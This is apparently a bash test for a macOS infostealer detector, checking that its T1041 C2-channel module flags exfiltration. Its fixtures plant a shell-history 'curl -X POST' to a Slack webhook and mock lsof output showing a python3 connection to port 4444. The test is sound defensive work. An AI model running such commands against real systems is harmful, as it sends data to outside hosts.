#!/usr/bin/env bash
set -e
source "$(dirname "$0")/helpers.sh"

setup_sandbox
setup_mock_bin
export INFOSTEALER_SCAN_PATHS="$HOME/Downloads:$HOME/Library/Caches"

cat > "$HOME/.zsh_history" <<'EOF'
curl -X POST https://hooks.slack.com/services/T000/B000/secret
EOF

cat > "$SANDBOX/mockbin/lsof" <<'EOF'
#!/usr/bin/env bash
if printf '%s ' "$@" | grep -q -- '-nP'; then
    printf '%s\n' 'python3 1234 tester 10u IPv4 0t0 TCP 10.0.0.2:51515->203.0.113.50:4444 (ESTABLISHED)'
else
    printf '%s\n' 'python3 1234 tester 10u IPv4 0t0 TCP host:51515->hooks.slack.com:https (ESTABLISHED)'
fi
EOF
chmod +x "$SANDBOX/mockbin/lsof"

cat > "$SANDBOX/mockbin/log" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' '2026-04-02 12:00:00 tester process webhook https://hooks.slack.com/services/T000/B000/secret'
EOF
chmod +x "$SANDBOX/mockbin/log"

output=$(bash "$REPO_ROOT/modules/exfiltration/T1041-c2-channel.sh" 2>&1) || true
assert_detected "T1041" "$output"
assert_contains "4444" "$output"
assert_contains "hooks.slack.com" "$output"
teardown_sandbox

setup_sandbox
setup_mock_bin
export INFOSTEALER_SCAN_PATHS="$HOME/Downloads:$HOME/Library/Caches"
cat > "$SANDBOX/mockbin/lsof" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod +x "$SANDBOX/mockbin/lsof"
cat > "$SANDBOX/mockbin/log" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod +x "$SANDBOX/mockbin/log"

output=$(bash "$REPO_ROOT/modules/exfiltration/T1041-c2-channel.sh" 2>&1) || true
assert_clean "T1041" "$output"
teardown_sandbox

echo "PASS"
exit 0
